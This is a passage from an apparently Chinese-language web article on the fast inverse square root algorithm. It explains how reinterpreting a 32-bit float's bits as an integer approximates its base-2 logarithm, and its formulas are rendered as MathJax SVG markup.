-10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></svg></mjx-container></span>
快速倒数平方根正是基于这个恒等式，有了x关于2的对数后，我们就可以反查对数表得到<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -1.334ex;" xmlns="http://www.w3.org/2000/svg" width="3.275ex" height="3.291ex" role="img" focusable="false" viewBox="0 -864.9 1447.6 1454.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(547,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="msqrt" transform="translate(220,-436.1) scale(0.707)"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mo" transform="translate(0,-34.6)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"></path></g><rect width="572" height="42.4" x="853" y="723"></rect></g><rect width="1207.6" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container></span>的值，因此它需要<strong>非常快速地计算
<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.294ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 572 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></svg></mjx-container></span>
的对数</strong>。事实证明，我们可以通过将32位浮点数重新解释为整数来近似计算对数。</p>
<p>回顾浮点数的表示方式，它按顺序存储符号位（对正数来说为0）、指数 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="2.157ex" height="1.357ex" role="img" focusable="false" viewBox="0 -442 953.5 599.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></g></svg></mjx-container></span> 和尾数 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="3.089ex" height="1.357ex" role="img" focusable="false" viewBox="0 -442 1365.5 599.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></g></svg></mjx-container></span>，因此浮点数 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.294ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 572 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></svg></mjx-container></span> 的表示可以写成（B为偏置）： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="29.482ex" height="2.593ex" role="img" focusable="false" viewBox="0 -896 13031 1146"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(849.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(1905.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mo" transform="translate(2294.6,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(3072.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="msup" transform="translate(3572.6,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mi" transform="translate(422,413) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><g data-mml-node="mo" transform="translate(4598.4,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(5598.6,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mo" transform="translate(953.5,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(1731.5,0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g><g data-mml-node="mo" transform="translate(8164.9,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mo" transform="translate(9165.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(9554.1,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(10276.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(11276.5,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mo" transform="translate(12642,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span> 其对数为： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="26.116ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 11543.1 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(278,0)"></path><path data-c="67" d="M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z" transform="translate(778,0)"></path></g><g data-mml-node="mn" transform="translate(1311,-241.4) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1714.6,0)"><path data-c="2061" d=""></path></g><g data-mml-node="mi" transform="translate(1881.2,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(2731,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(3786.8,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mo" transform="translate(4962.5,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(5962.7,0)"><g data-mml-node="mi"><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(278,0)"></path><path data-c="67" d="M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z" transform="translate(778,0)"></path></g><g data-mml-node="mn" transform="translate(1311,-241.4) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(7677.2,0)"><path data-c="2061" d=""></path></g><g data-mml-node="mo" transform="translate(7677.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(8066.2,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(8788.5,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(9788.7,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 